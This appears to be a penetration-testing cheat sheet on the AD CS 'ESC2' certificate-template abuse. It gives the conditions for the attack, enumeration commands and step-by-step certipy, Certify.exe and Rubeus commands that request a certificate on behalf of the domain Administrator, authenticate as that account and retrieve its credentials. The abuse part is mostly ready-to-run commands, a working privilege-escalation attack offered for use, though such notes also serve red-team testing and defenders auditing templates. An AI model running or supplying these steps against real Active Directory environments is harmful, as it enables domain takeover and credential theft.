## Overview
When a certificate template specifies the Any Purpose Extended Key Usage (EKU) or does not identify any Extended Key Usage, the certificate can be used for any purpose (client authentication, server authentication, code signing, etc.). it can be used as a requirement to request another certificate on behalf of any user.

So at first you will request certificate that has any purpose key usage, that will enable you to request certificates in bahalf of other users. 

> [!NOTE] 
> The first certificate that you have obtained it can't be used for authentication. But who cares, you can use it to request certificates as another users.


To abuse ESC2, the following conditions must be met:
1. The Enterprise CA must provide enrollment rights to low-privileged users.
2. Manager approval should be turned off.
3. No authorized signatures should be necessary.
4. The security descriptor of the certificate template must be excessively permissive, allowing low-privileged users to enroll for certificates.
5. The certificate template should define `Any Purpose Extended Key Usage` or `have no Extended Key Usage` specified.
6. There should be another template in ADCS that can be used to get authentication certificate.
OID: `2.5.29.37.0`

---
## Enumeration

### Linux 
#### Using certipy:
- `Any Purpose : True` (or the `Extended Key Usage : Any Purpose` field might be empty or missing).
- `Enrollment Agent : True` (always true if `Any Purpose` is true).

### Windows
#### Using certify.exe
```powershell
pkiextendedkeyusage                   : Any Purpose
```
#### Using powershell
```powershell
Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))' -SearchBase 'CN=Configuration,DC=lab,DC=local'
```

---
## Abuse
1. The attacker enrolls for a certificate using the "Any Purpose" template (e.g., `AnyPurposeCert`). This certificate can now act as an Enrollment Agent certificate.
2. The attacker uses this newly acquired "Any Purpose" certificate to request a _new_ certificate on behalf of a privileged user (e.g., Administrator). This second request targets a standard template like "User" or "Machine" that allows enrollment by enrollment agents and for which the target user has enrollment rights.
3. The attacker uses the "on-behalf-of" certificate to authenticate as the privileged user.
### Linux
```sh
# 1. Request the any key usage certificate
certipy req -u "$USER" -p "$PASSWORD" -dc-ip "$IP" -target "$CA"."$DOMAIN" -ca "$CA" -template 'AnyPurposeCert'

# 2. Use the certificate to ask for authentication certificate on behalf of other user.
certipy req -u "$USER" -p "$PASSWORD" -dc-ip "$IP" -target "$CA"."$DOMAIN" -ca "$CA" -template 'User'  -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'

# 3. Authenticate
certipy auth -pfx 'administrator.pfx' -dc-ip "$IP"
```

### Windows
```powershell
# 1. Request certificate that has enrollment agent "which will enable us to request other users certificates"
.\Certify.exe request --ca LAB-DC\lab-LAB-DC-CA --template ESC2

# 2. Request certificate in behalf of other user using the already granted certificate
.\Certify.exe request-agent --ca LAB-DC\lab-LAB-DC-CA --target administrator --agent-pfx $base64Certificate --template user
# or using the old certify
.\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:User /onbehalfof:LAB\Administrator /enrollcert:cert.pfx # pfx should be from openssl.

# 3. Use the certificate.
.\Rubeus.exe asktgt /user:lab\Administrator /certificate:admin.pfx /getcredentials
```